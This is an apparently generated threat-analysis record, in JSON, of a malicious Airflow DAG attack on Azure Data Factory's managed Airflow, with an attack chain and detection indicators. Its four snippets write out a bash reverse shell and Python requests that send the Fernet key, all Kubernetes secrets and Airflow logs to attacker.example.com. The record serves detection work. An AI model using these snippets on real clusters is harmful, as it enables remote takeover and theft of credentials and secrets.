@@ -1,0 +1,162 @@
+{
+  "package_info": {
+    "package_name": "Malicious Airflow DAG (Dirty DAG)",
+    "package_manager": "Custom/Azure Data Factory (Python DAGs via GitHub)",
+    "package_versions": "N/A (applies to any DAG file uploaded to vulnerable Airflow clusters)",
+    "why_malicious": "The package (malicious DAG file) is considered malicious because it is crafted to exploit misconfigurations in Azure Data Factory's Airflow integration, enabling unauthorized code execution, persistent access, and privilege escalation within the AKS cluster. The DAG is designed to establish a reverse shell, exfiltrate data, and potentially manipulate internal Azure services, violating the intended security boundaries of the managed Airflow environment."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "import-time",
+        "file_location": "DAG Python file (uploaded to Airflow DAGs directory via GitHub or storage account)",
+        "required_permissions": [
+          "network",
+          "filesystem",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "import os\nos.system('bash -i >& /dev/tcp/attacker.example.com/4444 0>&1')",
+      "code_language": "python",
+      "code_behavior": "At import-time, the code executes a bash command to initiate a reverse shell connection to an external attacker's server, enabling remote command execution and persistent unauthorized access.",
+      "malice_analysis": {
+        "why_suspicious": "This code executes a shell command that establishes an outbound TCP connection to an external server, which is a classic reverse shell technique used for remote access and control by attackers.",
+        "violated_expectations": "Normal DAG files should only define workflow logic and task scheduling, not execute arbitrary shell commands or establish external network connections at import-time.",
+        "similar_legitimate_use": "Rarely, DAGs may use os.system for local file operations, but never for reverse shells or external network connections.",
+        "key_indicators": [
+          "os.system call with a reverse shell payload",
+          "Hardcoded external IP/domain and port in shell command",
+          "Network connection initiated at DAG import-time"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "runtime",
+        "file_location": "DAG Python file (task definition)",
+        "required_permissions": [
+          "network",
+          "filesystem",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "import requests\nimport os\nsecrets = os.environ.get('AIRFLOW__CORE__FERNET_KEY')\nrequests.post('https://attacker.example.com/exfil', data={'secret': secrets})",
+      "code_language": "python",
+      "code_behavior": "At runtime, the code accesses the AIRFLOW__CORE__FERNET_KEY environment variable and sends its value to a hardcoded external domain via HTTPS POST, enabling credential exfiltration.",
+      "malice_analysis": {
+        "why_suspicious": "The code reads a sensitive Airflow secret from an environment variable and exfiltrates it to an external domain, which is a clear sign of credential theft.",
+        "violated_expectations": "DAG tasks should not access Airflow's internal secrets or transmit them outside the cluster.",
+        "similar_legitimate_use": "Legitimate DAGs may use requests to call APIs, but not to exfiltrate internal secrets to untrusted domains.",
+        "key_indicators": [
+          "Access to AIRFLOW__CORE__FERNET_KEY environment variable",
+          "Outbound HTTPS POST to attacker-controlled domain",
+          "No legitimate business logic for this data flow"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "runtime",
+        "file_location": "DAG Python file (task definition)",
+        "required_permissions": [
+          "kubernetes_api",
+          "cluster-admin",
+          "network"
+        ]
+      },
+      "code_snippet": "from kubernetes import client, config\nconfig.load_incluster_config()\nv1 = client.CoreV1Api()\nsecrets = v1.list_secret_for_all_namespaces()\nfor s in secrets.items:\n    # exfiltrate secret data\n    requests.post('https://attacker.example.com/k8s', data={'secret': s.data})",
+      "code_language": "python",
+      "code_behavior": "At runtime, the code uses cluster-admin Kubernetes API permissions to enumerate all secrets in the cluster and exfiltrates each secret's data to an external attacker's server via HTTPS POST, enabling mass credential theft and privilege escalation.",
+      "malice_analysis": {
+        "why_suspicious": "Accessing all Kubernetes secrets and sending them externally is a severe privilege abuse and a hallmark of cluster compromise.",
+        "violated_expectations": "DAGs should not interact with the Kubernetes API at cluster-admin level or exfiltrate secrets outside the cluster.",
+        "similar_legitimate_use": "Legitimate DAGs may interact with Kubernetes for job orchestration, but not for mass secret exfiltration.",
+        "key_indicators": [
+          "Use of cluster-admin Kubernetes API permissions",
+          "Enumeration of all Kubernetes secrets via list_secret_for_all_namespaces",
+          "Outbound data transfer of secrets to external domain"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_4",
+      "execution_context": {
+        "trigger": "runtime",
+        "file_location": "DAG Python file (task definition)",
+        "required_permissions": [
+          "network",
+          "filesystem"
+        ]
+      },
+      "code_snippet": "import requests\nrequests.post('https://attacker.example.com/logs', files={'log': open('/var/log/airflow/airflow.log', 'rb')})",
+      "code_language": "python",
+      "code_behavior": "At runtime, the code reads the Airflow log file from /var/log/airflow/airflow.log and exfiltrates its contents to an external attacker's server via HTTPS POST, enabling reconnaissance or anti-forensics.",
+      "malice_analysis": {
+        "why_suspicious": "Reading and exfiltrating internal log files to an external server can be used for reconnaissance or to cover tracks, which is not a normal DAG operation.",
+        "violated_expectations": "DAGs should not access or transmit Airflow's internal log files to external destinations.",
+        "similar_legitimate_use": "Log shipping is legitimate when sent to trusted, internal log management systems, not to arbitrary external domains.",
+        "key_indicators": [
+          "Access to /var/log/airflow/airflow.log file",
+          "Outbound HTTPS POST with log file data to untrusted domain"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker gains write access to Airflow DAG directory via misconfigured storage account or GitHub repository.",
+      "implemented_by": [],
+      "leads_to": "Upload of malicious DAG file"
+    },
+    {
+      "step": 2,
+      "action": "Malicious DAG file is imported by Airflow, triggering import-time code execution (reverse shell).",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Attacker gains remote shell access to Airflow environment"
+    },
+    {
+      "step": 3,
+      "action": "Malicious DAG tasks execute at runtime, exfiltrating secrets, credentials, and logs.",
+      "implemented_by": [
+        "snippet_2",
+        "snippet_3",
+        "snippet_4"
+      ],
+      "leads_to": "Attacker obtains sensitive data and maintains persistence"
+    },
+    {
+      "step": 4,
+      "action": "Attacker uses cluster-admin permissions to further compromise the AKS cluster, manipulate Geneva service, or escalate privileges.",
+      "implemented_by": [
+        "snippet_3"
+      ],
+      "leads_to": "Full cluster compromise and potential lateral movement"
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "DAG files containing os.system or subprocess calls with reverse shell payloads",
+      "DAGs accessing sensitive environment variables such as AIRFLOW__CORE__FERNET_KEY",
+      "DAGs making outbound network requests to untrusted or attacker-controlled domains",
+      "DAGs importing kubernetes client and listing secrets using cluster-admin permissions",
+      "DAGs reading and exfiltrating log files such as /var/log/airflow/airflow.log"
+    ],
+    "file_indicators": [
+      "DAG Python files with import-time code execution (e.g., code outside function or class definitions)",
+      "DAGs containing hardcoded external IPs/domains such as attacker.example.com",
+      "DAGs with code accessing /var/log/airflow/airflow.log"
+    ],
+    "network_indicators": [
+      "Outbound connections from Airflow pods to attacker-controlled domains (e.g., attacker.example.com)",
+      "Unusual HTTPS POST requests from Airflow environment to external IPs or domains",
+      "Reverse shell TCP connections initiated from Airflow environment to non-standard ports"
+    ],
+    "how_to_detect": "Monitor DAG files for import-time code execution, especially os.system or subprocess calls with network payloads. Flag DAGs that access sensitive environment variables or Kubernetes secrets. Alert on outbound network connections from Airflow pods to untrusted domains, especially during DAG import or task execution. Audit for DAGs that read internal log files or attempt to exfiltrate data externally. Review RBAC permissions for Airflow service accounts to prevent cluster-admin privilege abuse and restrict access to sensitive Kubernetes APIs."
+  }
+}
